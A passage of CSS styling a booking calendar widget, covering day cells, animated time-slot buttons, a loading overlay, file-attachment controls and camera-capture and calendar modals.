            opacity: 0;
            transition: opacity 0.8s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .calendar-wrapper,
        .calendar-wrapper * {
            -webkit-user-select: none;
            user-select: none;
            -webkit-touch-callout: none;
        }

        .calendar-wrapper button,
        .calendar-wrapper [role="button"] {
            -webkit-tap-highlight-color: transparent;
        }
        .calendar-wrapper.calendar--loaded {
            opacity: 1;
        }
        .calendar-wrapper.calendar--loading {
            background: transparent !important;
            border: 0 !important;
            border-color: transparent !important;
            outline: 0 !important;
            box-shadow: none !important;
            backdrop-filter: none !important;
            -webkit-backdrop-filter: none !important;
        }
        .calendar-wrapper.calendar--loading #calendarLoaderOverlay {
            background: transparent !important;
            backdrop-filter: none !important;
            -webkit-backdrop-filter: none !important;
            border-radius: 0 !important;
        }
        .calendar-wrapper.calendar--loading .calendar-header,
        .calendar-wrapper.calendar--loading .calendar-grid,
        .calendar-wrapper.calendar--loading .slots-nav,
        .calendar-wrapper.calendar--loading .slots-block,
        .calendar-wrapper.calendar--loading .loading-separator {
            opacity: 0 !important;
            visibility: hidden;
            pointer-events: none;
        }
        .contact-form__outside-title.calendar-title--loading {
            opacity: 0 !important;
            visibility: hidden !important;
        }
        
        .slots-block {
            padding: 0;
            margin-top: 0;
            display: block;
            min-height: clamp(7.8rem, 15vh, 11rem);
            visibility: hidden;
            pointer-events: none;
        }

        .slots-block[style*="display:block"],
        .slots-block[style*="display: block"] {
            visibility: visible;
            pointer-events: auto;
        }

        .slots-block[style*="display:none"],
        .slots-block[style*="display: none"] {
            display: block !important;
            visibility: hidden !important;
            pointer-events: none !important;
        }
        
        .calendar-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 2rem;
            text-align: center;
            padding: 0 0.6rem;
        }

        .calendar-title {
            font-size: 2rem;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            color: #ffffff;
            text-shadow: 0 1px 1px rgba(0,0,0,0.1);
            line-height: 1.2;
            display: flex;
            flex-direction: column;
            gap: 0.2rem;
            align-items: center;
        }

        /* "Wait..." Animation */
        .loading-text {
            font-size: 1.2rem;
            font-weight: 800;
            color: rgba(255, 255, 255, 0.8);
            letter-spacing: 1px;
            animation: pulseText 1.5s infinite ease-in-out;
        }
        
        
        .calendar-title span { display: block; }
        .calendar-title .cal-month { font-size: 5.3rem; font-weight: 900; line-height: 0.9; }
        .calendar-title .cal-selected-day {
            font-size: 1.85rem;
            line-height: 1.02;
            font-weight: 900;
            white-space: nowrap;
        }
        .calendar-title .cal-year { font-size: 1.98rem; opacity: 0.92; font-weight: 900; letter-spacing: 2px; margin-top: -0.15rem; }

        .calendar-nav-btn {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid transparent;
            color: #ffffff;
            width: 3rem;
            height: 3rem;
            min-width: 3rem;
            min-height: 3rem;
            flex: 0 0 3rem;
            border-radius: 50%;
            cursor: pointer;
            font-size: 1.55rem;
            line-height: 1;
            padding: 0;
            transition: all 0.3s ease;
            display: inline-grid;
            place-items: center;
            opacity: 0.7;
        }

        #prevBtn { text-indent: -1px; }
        #nextBtn { text-indent: 1px; }

        .calendar-nav-btn:hover {
            background: rgba(255, 255, 255, 0.25);
            border-color: rgba(255, 255, 255, 0.2);
            transform: translateY(-2px);
            opacity: 1;
        }

        .calendar-nav-btn:disabled,
        .calendar-nav-btn[aria-disabled="true"] {
            opacity: 0.28;
            cursor: not-allowed;
            pointer-events: none;
            transform: none;
            background: rgba(255, 255, 255, 0.06);
            border-color: rgba(255, 255, 255, 0.08);
        }

        /* Calendar Loader Overlay */
        #calendarLoaderOverlay {
            position: absolute;
            inset: 0;
            background: rgba(191, 167, 146, 0.4);
            display: none;
            flex-direction: column; /* Added to support text below spinner */
            align-items: center;
            justify-content: center;
            z-index: 10;
            border-radius: 3rem;
            backdrop-filter: blur(4px);
            -webkit-backdrop-filter: blur(4px);
            gap: 15px; /* Space between spinner and text */
        }

        #calendarLoaderOverlay.calendar-loader--error {
            background: rgba(64, 48, 31, 0.58);
            backdrop-filter: blur(6px);
            -webkit-backdrop-filter: blur(6px);
        }
        
        #calendarLoaderOverlay span {
            color: #ffffff;
            font-weight: 800;
            font-size: 0.9rem;
            text-shadow: 0 1px 3px rgba(0,0,0,0.2);
        }
        
        .cal-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(255, 255, 255, 0.2);
            border-top-color: #ffffff;
            border-radius: 50%;
            animation: calSpin 0.8s linear infinite;
        }
        
        @keyframes calSpin {
            to { transform: rotate(360deg); }
        }

        .calendar-grid {
            display: grid;
            grid-template-columns: repeat(7, 1fr);
            gap: 0.62rem;
            text-align: center;
            min-height: clamp(18rem, 37vh, 24rem);
        }

        .cal-day-name {
            font-family: 'Lato', sans-serif;
            font-weight: 700;
            color: rgba(255, 255, 255, 0.6);
            font-size: 0.8rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 1rem;
            line-height: 1.1;
        }

        .cal-day {
            aspect-ratio: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%; /* Reverted to circular shape */
            color: rgba(255, 255, 255, 0.7);
            background: rgba(255, 255, 255, 0.1); 
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            font-family: 'Lato', sans-serif;
            font-size: clamp(0.98rem, 1.85vw, 1.08rem);
            line-height: 1;
            letter-spacing: 0;
            border: 1px solid transparent;
            font-weight: 700;
            font-variant-numeric: tabular-nums;
            font-feature-settings: "tnum" 1, "lnum" 1;
            text-rendering: geometricPrecision;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .cal-day:hover:not(.cal-day--empty):not(.cal-day--disabled) {
            background: rgba(255, 255, 255, 0.25); /* Increased from 0.15 */
            border-color: rgba(255, 255, 255, 0.2);
            transform: translateY(-2px);
        }

        .cal-day--disabled {
            opacity: 0.38 !important;
            cursor: default;
            pointer-events: none;
        }

        .cal-day--busy {
            opacity: 0.3 !important;
            cursor: default;
            pointer-events: none;
        }

        .cal-day--closed {
            opacity: 1 !important;
            cursor: pointer;
            pointer-events: auto;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid transparent !important;
        }

        .cal-day--closed:hover {
            background: rgba(255, 255, 255, 0.25);
            border-color: rgba(255, 255, 255, 0.2) !important;
            transform: translateY(-2px);
        }

        .cal-day--selected {
            background: #ffffff !important;
            color: #6B5B4A !important;
            font-weight: 700;
            border: 1px solid rgba(255, 255, 255, 0.3);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            transform: scale(1.05);
        }

        .cal-day--nearest {
            border-color: rgba(255, 255, 255, 0.75) !important;
            box-shadow:
                0 0 0.38rem rgba(255, 255, 255, 0.92),
                0 0 1.15rem rgba(255, 255, 255, 0.72);
            animation: nearestDayGlow 1.8s ease-in-out infinite;
        }

        .cal-day--nearest.cal-day--selected {
            box-shadow:
                0 0 0.45rem rgba(255, 255, 255, 0.98),
                0 0 1.35rem rgba(255, 255, 255, 0.78),
                0 0 2rem rgba(255, 255, 255, 0.55) !important;
        }

        @keyframes nearestDayGlow {
            0%, 100% {
                box-shadow:
                    0 0 0.34rem rgba(255, 255, 255, 0.88),
                    0 0 1rem rgba(255, 255, 255, 0.66);
            }
            50% {
                box-shadow:
                    0 0 0.58rem rgba(255, 255, 255, 1),
                    0 0 1.7rem rgba(255, 255, 255, 0.9);
            }
        }

        @keyframes pulseActive {
            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(224, 112, 32, 0.4); }
            70% { transform: scale(1.05); box-shadow: 0 0 0 0.6rem rgba(224, 112, 32, 0); }
            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(224, 112, 32, 0); }
        }

        .cal-key {
            display: flex;
            align-items: center;
            justify-content: center;
            --calendar-key-size: clamp(1.55rem, 3.8vw, 2.35rem);
            width: var(--calendar-key-size);
            height: var(--calendar-key-size);
            line-height: 0;
            color: rgba(255, 255, 255, 0.96);
            opacity: 0.96;
            transition: color 0.2s ease, opacity 0.2s ease, filter 0.2s ease;
            /* previous upward offset removed so icon sits exactly in the centre */
            margin-top: 0;
        }

        /* Saturday-specific adjustment: ensuring the key span isn't shifted */
        .cal-day--closed .cal-key {
            margin: 0;
        }

        .cal-day--selected .cal-key {
            color: var(--accent-gold) !important;
            opacity: 1;
            filter: drop-shadow(0 0 0.16rem rgba(107, 91, 74, 0.28));
        }

        .cal-key svg,
        .cal-key img {
            width: 100%;
            height: 100%;
            transform: none;
            transform-origin: center;
            display: block;
            object-fit: contain;
        }

        @keyframes keyRotate {
            0% { transform: rotate(45deg); }
            100% { transform: rotate(405deg); }
        }

        
        
        .cal-day--today {
            border: 0.2rem solid #ffffff; /* Reverted from 0.35rem */
            box-shadow: 0 0 0.5rem rgba(255, 255, 255, 0.4) !important;
            opacity: 1 !important;
        }

        .cal-day--has-slots {
            background: rgba(255, 255, 255, 0.2);
            opacity: 1 !important;
            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        /* Slots Section */
        .slots-container {
            margin-top: 0;
            margin-bottom: 0.3rem;
            padding-top: 0;
            display: block;
            position: relative;
        }

        .slots-saturday-warning {
            grid-column: 1 / -1;
            margin: 0.2rem 0 0.65rem;
            padding: 0.6rem 0.75rem;
            border-radius: 0.7rem;
            border: 1px solid rgba(255, 255, 255, 0.38);
            background: rgba(90, 61, 42, 0.28);
            color: #ffffff;
            text-align: center;
            font-size: 0.95rem;
            font-weight: 800;
            line-height: 1.35;
            letter-spacing: 0.4px;
        }

        /* Loading Progress Bar Separator */
        .loading-separator {
            position: absolute;
            top: 0;
            left: 10%; /* Centered at 80% width */
            width: 80%;
            height: 1px;
            background: rgba(255, 255, 255, 0.1); 
            overflow: hidden;
            opacity: 0; /* Hidden by default */
            transition: opacity 0.5s ease;
            
            -webkit-mask-image: linear-gradient(to right, transparent, black 15%, black 85%, transparent);
            mask-image: linear-gradient(to right, transparent, black 15%, black 85%, transparent);
        }

        .loading-separator--active {
            opacity: 1;
        }

        /* Animated bar */
        .loading-separator::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 50%;
            height: 100%;
            background: linear-gradient(90deg, transparent, #ffffff, transparent);
            box-shadow: 0 0 1rem rgba(255, 255, 255, 1);
            opacity: 0; /* Hidden by default */
            transition: opacity 0.8s ease-out; /* Smooth fade out */
            
            animation: loadingScan 1.5s infinite linear;
        }

        .loading-separator--active::after {
            opacity: 1;
        }

        @keyframes loadingScan {
            0% { transform: translateX(-100%); }
            15% { transform: translateX(200%); } /* Quick scan */
            100% { transform: translateX(200%); } /* Wait */
        }

        .loading-separator::after {
            animation: loadingScan 10s infinite linear; /* Run every 10s */
        }

        .slots-title {
            font-size: 1.4rem; /* Increased from 1.1rem */
            font-weight: 800; /* Increased from 600 */
            margin-bottom: 2rem;
            text-align: center;
            color: rgba(255, 255, 255, 0.9);
            letter-spacing: 1px;
            display: none; /* Hidden by default */
            animation: fadeTitle 0.5s ease forwards;
        }

        .cal-cta {
            font-size: 1.4rem; /* Increased from 1.1rem */
            font-weight: 800; /* Increased from 600 */
            margin-bottom: 2rem;
            text-align: center;
            color: rgba(255, 255, 255, 0.9);
            letter-spacing: 1px;
            display: none; /* Hidden by default */
        }

        @keyframes fadeTitle { from { opacity: 0; transform: translateY(0.6rem); } to { opacity: 1; transform: translateY(0); } }

        .slots-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 1.5rem; 
            margin-top: 0.2rem;
        }

        .slots-grid .slot-btn {
            display: flex !important;
            flex-direction: row !important;
            align-items: center !important;
            justify-content: center !important;
            padding: 1rem 2rem;
            height: 8.2rem;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.15);
            color: rgba(255, 255, 255, 0.9);
            border-radius: 5rem;
            cursor: pointer;
            transition: all 0.6s cubic-bezier(0.23, 1, 0.32, 1);
            font-family: 'Lato', sans-serif !important;
            backdrop-filter: blur(0.6rem);
            -webkit-backdrop-filter: blur(0.6rem);
            gap: 2rem;
            box-shadow: inset 0 1px 0 rgba(255,255,255,0.1);
            width: 100%;
            position: relative;
            overflow: visible;
            isolation: isolate;
            z-index: 0;
            transform: translateZ(0);
            backface-visibility: hidden;
        }

        .slot-btn--hypnotic {
            border-color: rgba(255, 255, 255, 0.22);
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.18);
            animation: slotRevealRise 2s cubic-bezier(0.18, 0.88, 0.25, 1) both;
            animation-delay: calc(var(--slot-idx, 0) * 55ms);
        }

        .slot-btn--hypnotic::before {
            content: "";
            position: absolute;
            left: 50%;
            top: calc(100% + clamp(0.14rem, 0.55vw, 0.32rem));
            width: clamp(6.8rem, 18vw, 11.2rem);
            height: clamp(1.6rem, 4.2vw, 2.7rem);
            transform: translate3d(-50%, -50%, 0) scale(0.92);
            border-radius: 50%;
            background: radial-gradient(
                ellipse at center,
                rgba(255, 255, 255, 0.92) 0%,
                rgba(255, 255, 255, 0.56) 30%,
                rgba(255, 255, 255, 0.2) 58%,
                rgba(255, 255, 255, 0.04) 80%,
                rgba(255, 255, 255, 0) 100%
            );
            filter: blur(6px);
            opacity: 0.1;
            pointer-events: none;
            z-index: -3;
            will-change: opacity, transform;
            backface-visibility: hidden;
            transition: opacity 160ms ease, transform 280ms ease, filter 280ms ease;
        }

        .slot-btn--hypnotic::after {
            content: "";
            position: absolute;
            left: 50%;
            top: 66%;
            width: clamp(16rem, 44vw, 30rem);
            height: clamp(13.5rem, 35vw, 23rem);
            transform: translate3d(-50%, -50%, 0) scale(0.92);
            border-radius: 50%;
            background: radial-gradient(
                ellipse at center,
                rgba(255, 255, 255, 0) 28%,
                rgba(255, 255, 255, 0.52) 40%,
                rgba(255, 255, 255, 0.24) 49%,
                rgba(255, 255, 255, 0.1) 60%,
                rgba(255, 255, 255, 0.03) 70%,
                rgba(255, 255, 255, 0) 82%
            );
            filter: none;
            opacity: 0;
            pointer-events: none;
            z-index: -2;
            box-shadow:
                0 0 1rem rgba(255, 255, 255, 0.16),
                0 0 2.2rem rgba(255, 255, 255, 0.1);
            will-change: opacity, transform;
            backface-visibility: hidden;
            outline: 1px solid transparent;
            transition: opacity 180ms ease, transform 380ms ease, filter 380ms ease;
        }

        .slot-btn--hypnotic > * {
            position: relative;
            z-index: 2;
        }

        .slot-btn--hypnotic .slot-icon-wrapper {
            will-change: transform;
        }

        .slot-btn--hypnotic:hover,
        .slot-btn--hypnotic:focus-visible {
            background: rgba(255, 255, 255, 0.2);
            border-color: rgba(255, 255, 255, 0.9);
            transform: translateY(-2px);
            animation: none;
            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.48),
                inset 0 0 0 1px rgba(255, 255, 255, 0.24);
        }

        .slot-btn--hypnotic:hover::before,
        .slot-btn--hypnotic:focus-visible::before {
            opacity: 0.72;
            transform: translate3d(-50%, -50%, 0) scale(1.08);
            filter: blur(7px);
        }

        .slot-btn--hypnotic:hover::after,
        .slot-btn--hypnotic:focus-visible::after {
            opacity: 0.78;
            transform: translate3d(-50%, -50%, 0) scale(1.04);
            filter: none;
            animation: slotBacklightPulseHuge 1.12s ease-in-out infinite alternate;
        }

        @keyframes slotBacklightPulseHuge {
            0% {
                opacity: 0.52;
                transform: translate3d(-50%, -50%, 0) scale(0.98);
            }
            100% {
                opacity: 0.82;
                transform: translate3d(-50%, -50%, 0) scale(1.07);
            }
        }

        @keyframes slotRevealRise {
            from {
                opacity: 0;
                transform: translateY(10px) scale(0.96);
                filter: blur(2px);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
                filter: blur(0);
            }
        }

        .slot-btn > div, .slot-btn > span {
            flex-grow: 0 !important;
            flex-shrink: 0 !important;
        }

        .slot-icon-wrapper {
            width: 5rem;
            height: 5rem;
            flex-shrink: 0;
        }

        .slot-icon-wrapper svg {
            width: 100% !important;
            height: 100% !important;
        }

        .slot-time {
            font-size: clamp(1.8rem, 5vw, 2.2rem);
            font-weight: 800;
            letter-spacing: 2px;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            line-height: 1.08;
            padding-bottom: clamp(2.35rem, 5.6vw, 3.05rem);
        }

        .slot-date-legal {
            position: absolute;
            left: auto;
            right: clamp(0rem, 0.12vw, 0.12rem);
            bottom: clamp(0.08rem, 0.55vw, 0.3rem);
            transform: none;
            display: block;
            margin-top: 0;
            font-size: clamp(1.45rem, 3.8vw, 2rem);
            font-weight: 800;
            letter-spacing: 0.03em;
            line-height: 1;
            text-align: right;
            opacity: 0.98;
            white-space: nowrap;
            pointer-events: none;
        }

        .slot-btn:not(.slot-btn--hypnotic):hover::after { opacity: 1; }

        @keyframes slideUpFade {
            from { opacity: 0; transform: translateY(0.9rem); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes constantGlow {
            0% { 
                background: rgba(255, 255, 255, 0.25); 
                box-shadow: 0 0 1rem rgba(255, 255, 255, 0.3);
                border-color: rgba(255, 255, 255, 0.5);
            }
            50% { 
                background: rgba(255, 255, 255, 0.15); 
                box-shadow: 0 0 0.3rem rgba(255, 255, 255, 0.1);
                border-color: rgba(255, 255, 255, 0.25);
            }
        }

        @keyframes rotateIcon {
            0% { transform: rotate(0deg); }
            30% { transform: rotate(360deg); }
            100% { transform: rotate(360deg); }
        }

        .slot-icon-wrapper {
            display: inline-block;
            line-height: 0;
        }

        .clock-hand {
            transform-origin: 50% 50%;
            transform: rotate(var(--start));
        }

        .slot-btn--clicked .clock-hand {
            animation: none;
        }

        @keyframes handSweepClick {
            to { transform: rotate(var(--end)); }
        }

        @keyframes handRotateContinuous {
            from { transform: rotate(var(--start)); }
            to { transform: rotate(calc(var(--start) + 360deg)); }
        }

        .slot-btn:hover:not(.slot-btn--clicked) .minute-hand {
            animation: none;
        }
        .slot-btn:hover:not(.slot-btn--clicked) .hour-hand {
            animation: none;
        }

        .slot-btn--clicked {
            animation: slotClickBurst 0.55s cubic-bezier(0.2, 0.8, 0.2, 1) forwards !important;
            pointer-events: none;
        }

        .slot-btn--clicked::before,
        .slot-btn--clicked::after {
            animation: none !important;
            opacity: 0.2;
        }

        @keyframes slotClickBurst {
            0% {
                transform: translateY(0) scale(1);
                filter: saturate(1);
            }
            35% {
                transform: translateY(-2px) scale(1.04);
                filter: saturate(1.2);
            }
            100% {
                transform: translateY(0) scale(0.985);
                filter: saturate(1);
            }
        }

        @keyframes btnClickScale {
            0% { transform: scale(1); }
            50% { transform: scale(0.95); }
            100% { transform: scale(1); }
        }

        /* Breathing Glow Animation */
        @keyframes breathingGlow {
            0% { 
                text-shadow: 0 0 0.3rem rgba(255, 255, 255, 0.2); 
                opacity: 0.6; 
            }
            50% { 
                text-shadow: 0 0 1.3rem rgba(255, 255, 255, 0.8), 0 0 0.6rem rgba(255, 255, 255, 0.6); 
                opacity: 1; 
                color: #fff; 
            }
            100% { 
                text-shadow: 0 0 0.3rem rgba(255, 255, 255, 0.2); 
                opacity: 0.6; 
            }
        }

        @media (prefers-reduced-motion: reduce) {
            .slot-btn--hypnotic,
            .slot-btn--hypnotic::before,
            .slot-btn--hypnotic::after,
            .slot-btn--hypnotic .slot-icon-wrapper {
                animation: none !important;
            }

            .slots-grid .slot-btn {
                transition: none !important;
            }
        }

        /* Loader */
        .calendar-loader {
            text-align: center;
            padding: 3.1rem;
            font-weight: 800;
            color: rgba(255,255,255,0.6);
            display: none;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 2px;
            animation: breathingGlow 2s infinite ease-in-out;
        }
        /* Modal Specific Input Styles */
        .modal .contact-form__input,
        .modal .contact-form__textarea {
            text-align: left; /* Left align on all devices */
        }
        .modal .contact-form__input::placeholder,
        .modal .contact-form__textarea::placeholder {
            font-size: 0.8rem;
            opacity: 0.7;
            text-align: left;
        }

        /* Next Available Message */
        .next-available-msg {
            text-align: center;
            margin-top: 1.3rem;
            font-size: 1rem;
            color: #fff;
            font-weight: 800;
            opacity: 0;
            transition: opacity 0.5s ease;
        }
        .next-available-msg--visible { opacity: 1; }

        /* File Attachment Styles */
        .file-attach {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 1rem;
            margin-top: 0.3rem;
            width: 100%;
        }

        .file-attach__controls {
            width: 100%;
            display: grid;
            grid-template-columns: auto minmax(0, 1fr) auto;
            gap: 0.7rem;
            align-items: stretch;
        }

        .file-attach__btn {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 0.35rem;
            width: 100%;
            padding: 1rem;
            background: var(--input-bg);
            border: 2px dashed rgba(255, 255, 255, 0.65);
            border-radius: 0.8rem;
            color: var(--placeholder-color);
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: inherit;
            font-size: 1rem;
            font-weight: 800;
            line-height: 1.3;
            text-align: center;
        }

        .file-attach__btn:not(.file-attach__btn--camera) .file-attach__title,
        .file-attach__btn:not(.file-attach__btn--camera) .file-attach__icon,
        .file-attach__btn:not(.file-attach__btn--camera) .file-attach__icon-svg,
        .file-attach__btn:not(.file-attach__btn--camera):hover .file-attach__title,
        .file-attach__btn:not(.file-attach__btn--camera):hover .file-attach__icon,
        .file-attach__btn:not(.file-attach__btn--camera):hover .file-attach__icon-svg,
        .file-attach__btn:not(.file-attach__btn--camera):focus-visible .file-attach__title,
        .file-attach__btn:not(.file-attach__btn--camera):focus-visible .file-attach__icon,
        .file-attach__btn:not(.file-attach__btn--camera):focus-visible .file-attach__icon-svg {
            color: #ffffff !important;
            stroke: #ffffff !important;
        }

        .file-attach__btn:not(.file-attach__btn--camera):hover,
        .file-attach__btn:not(.file-attach__btn--camera):focus-visible {
            background: rgba(255, 255, 255, 0.5) !important;
            color: #ffffff !important;
        }

        .file-attach__btn--camera {
            border-style: solid;
            border-width: 2px;
            border-color: #5a3d2a;
            background: #5a3d2a;
            color: #ffffff;
            width: 5.25rem;
            min-width: 5.25rem;
            height: 5.25rem;
            min-height: 5.25rem;
            padding: 0.5rem;
            gap: 0.2rem;
            flex-direction: column;
        }

        .file-attach__btn--camera .file-attach__hint {
            display: none;
        }

        .file-attach__btn--camera .file-attach__title {
            font-size: 0;
            letter-spacing: 0;
            text-transform: none;
            gap: 0;
            margin: 0;
            line-height: 1;
        }

        .file-attach__btn--camera .file-attach__icon {
            font-size: 2rem;
        }

        .file-attach__btn--camera .file-attach__icon-svg,
        .file-attach__icon-svg--camera {
            width: 1.85em !important;
            height: 1.85em !important;
            animation: none !important;
        }

        .file-attach__btn--camera .file-attach__icon-svg,
        .file-attach__btn--camera .file-attach__icon-svg--camera {
            color: #ffffff !important;
            stroke: #ffffff !important;
        }

        .file-attach__btn--camera:hover .file-attach__icon-svg,
        .file-attach__btn--camera:hover .file-attach__icon-svg--camera,
        .file-attach__btn--camera:focus-visible .file-attach__icon-svg,
        .file-attach__btn--camera:focus-visible .file-attach__icon-svg--camera {
            color: #5a3d2a !important;
            stroke: #5a3d2a !important;
        }

        .file-attach__btn--camera:hover,
        .file-attach__btn--camera:focus-visible {
            background: #ffffff !important;
            border-color: #ffffff !important;
            color: #5a3d2a !important;
        }

        .file-attach__btn:hover,
        .file-attach__btn:focus-visible {
            background: #ffffff;
            border-color: rgba(255, 255, 255, 0.5);
            color: #5a3d2a;
            box-shadow: 0 2px 0.5rem rgba(0, 0, 0, 0.12);
        }

            @media (max-width: 520px) {
                .file-attach__controls {
                    grid-template-columns: 1fr;
                }
            }
        .file-attach__drop-zone-file--drag-over {
            background: #ffffff !important;
            border-color: #5a3d2a !important;
            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.55), 0 6px 20px rgba(255, 255, 255, 0.22) !important;
        }

        .file-attach__drop-zone-file--drag-over .file-attach__btn {
            background: #ffffff !important;
            border-color: #5a3d2a !important;
            color: #5a3d2a !important;
            box-shadow: none !important;
        }

        .file-attach__drop-zone-file--drag-over .file-attach__title,
        .file-attach__drop-zone-file--drag-over .file-attach__icon,
        .file-attach__drop-zone-file--drag-over .file-attach__icon-svg,
        .file-attach__drop-zone-file--drag-over p {
            color: #5a3d2a !important;
            stroke: #5a3d2a !important;
        }

        .file-attach__title {
            font-size: 1.02rem;
            font-weight: 800;
            letter-spacing: 0.03em;
            text-transform: uppercase;
            line-height: 1.15;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.4rem;
        }

        .file-attach__hint {
            display: block;
            width: 100%;
            text-align: center;
            font-size: 1.12rem;
            font-weight: 800;
            letter-spacing: 0.03em;
            line-height: 1.2;
            opacity: 0.9;
            text-transform: uppercase;
        }

        /* Paperclip Attention Animation */
        @keyframes paperclipAttention {
            0%, 90%, 100% { transform: rotate(0deg) scale(1); }
            92% { transform: rotate(5deg) scale(1.05); }
            94% { transform: rotate(-5deg) scale(1.05); }
            96% { transform: rotate(5deg) scale(1.05); }
            98% { transform: rotate(-2deg) scale(1.02); }
        }

        .file-attach__icon-svg {
            display: inline-block;
            transform-origin: center center;
            animation: paperclipAttention 8s infinite ease-in-out;
            width: 1.1em !important; 
            height: 1.1em !important;
        }

        .file-attach__icon-svg--paperclip {
            width: 1.42em !important;
            height: 1.42em !important;
        }

        .file-attach__icon {
            font-size: 1rem;
            line-height: 1;
            display: flex;
        }

        .file-attach__terms {
            margin-top: 0.1rem;
            margin-bottom: 0.3rem;
        }

        .file-attach__list {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
        }

        .file-attach__item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0.6rem 0.9rem;
            background: rgba(255, 255, 255, 0.08);
            border-radius: 0.5rem;
            font-size: 0.9rem;
            color: rgba(255, 255, 255, 0.9);
            position: relative;
            overflow: hidden;
        }

        .file-attach__name {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            max-width: 80%;
        }

        .file-attach__remove {
            background: none;
            border: none;
            color: rgba(255, 255, 255, 0.5);
            cursor: pointer;
            font-size: 1.2rem;
            padding: 0 0.3rem; 
            transition: color 0.3s;
        }

        .file-attach__remove:hover {
            color: #ff6b6b;
        }

        .file-attach__progress {
            position: absolute;
            bottom: 0;
            left: 0;
            height: 0.2rem;
            background: rgba(255, 255, 255, 0.6);
            width: 0%;
            transition: width 0.5s ease-out;
        }

        .camera-capture-modal {
            display: none;
            position: fixed;
            inset: 0;
            z-index: 21050;
            background: rgba(0, 0, 0, 0.78);
            backdrop-filter: blur(4px);
            -webkit-backdrop-filter: blur(4px);
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }

        .camera-capture-modal--active {
            display: flex;
        }

        .form-calendar-overlay {
            display: none;
            position: fixed;
            inset: 0;
            z-index: 22080;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(4px);
            -webkit-backdrop-filter: blur(4px);
            align-items: stretch;
            justify-content: stretch;
            padding: 0;
        }

        .form-calendar-overlay--active {
            display: flex;
        }

        .form-calendar-overlay__panel {
            width: 100vw;
            height: 100vh;
            height: 100dvh;
            max-height: none;
            overflow: hidden;
            border-radius: 0;
            border: none;
            background: #3a2a1a;
            box-shadow: none;
            padding: clamp(0.75rem, 2.2vh, 1.15rem) clamp(0.6rem, 2.6vw, 1.1rem);
            display: flex;
            flex-direction: column;
        }

        .form-calendar-overlay__header {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
            margin-bottom: 0.55rem;
            padding: 0.1rem 0 0.25rem;
            flex-shrink: 0;
        }

        .form-calendar-overlay__title {
            margin: 0;
            width: 100%;
            text-align: center;
            padding-left: 3rem;
            padding-right: 3rem;
            font-size: 1rem;
            font-weight: 900;
            color: #ffffff;
            letter-spacing: 0.03em;
            text-transform: uppercase;
        }

        .form-calendar-overlay__hint {
            margin: 0.2rem 0 0;
            text-align: center;
            font-size: 0.86rem;
            font-weight: 700;
            color: rgba(255, 255, 255, 0.8);
            letter-spacing: 0.01em;
        }

        .form-calendar-overlay__close {
            position: absolute;
            left: 0;
            right: auto;
            top: 0;
            transform: none;
            width: 2.25rem;
            height: 2.25rem;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 999px;
            border: 1px solid rgba(255, 255, 255, 0.35);
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            font-size: 1.25rem;
            line-height: 1;
            font-weight: 700;
            cursor: pointer;
        }

        .form-calendar-overlay__mount {
            width: 100%;
            flex: 1 1 auto;
            min-height: 0;
            overflow: auto;
        }

        .form-calendar-overlay__mount .calendar-scale-wrapper {
            width: 100%;
            margin: 0;
        }

        .form-calendar-overlay__mount .calendar-scale-inner {
            transform-origin: top left;
        }

        .form-calendar-overlay__mount #bookingCalendar {
            margin: 0;
        }

        .camera-capture__panel {
            width: min(35rem, 96vw);
            border-radius: 1rem;
            border: 1px solid rgba(255, 255, 255, 0.24);
            background: #3a2a1a;
            box-shadow: 0 1.5rem 2.8rem rgba(0, 0, 0, 0.38);
            padding: 1rem;
        }

        .camera-capture__title {
            margin: 0 0 0.7rem 0;
            color: #fff;
            font-size: 1.02rem;
            font-weight: 900;
            letter-spacing: 0.03em;
            text-transform: uppercase;
            text-align: center;
        }

        .camera-capture__video-wrap {
            border-radius: 0.78rem;
            overflow: hidden;
            background: #000;
            aspect-ratio: 4 / 3;
            border: 1px solid rgba(255, 255, 255, 0.18);
        }

        .camera-capture__video {
            width: 100%;
            height: 100%;
            display: block;
            object-fit: cover;
        }

        .camera-capture__status {
            margin: 0.6rem 0 0.7rem;
            font-size: 0.85rem;
            font-weight: 800;
            color: rgba(255, 255, 255, 0.86);
            text-align: center;
            min-height: 1.05rem;
        }

        .camera-capture__actions {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 0.6rem;
        }

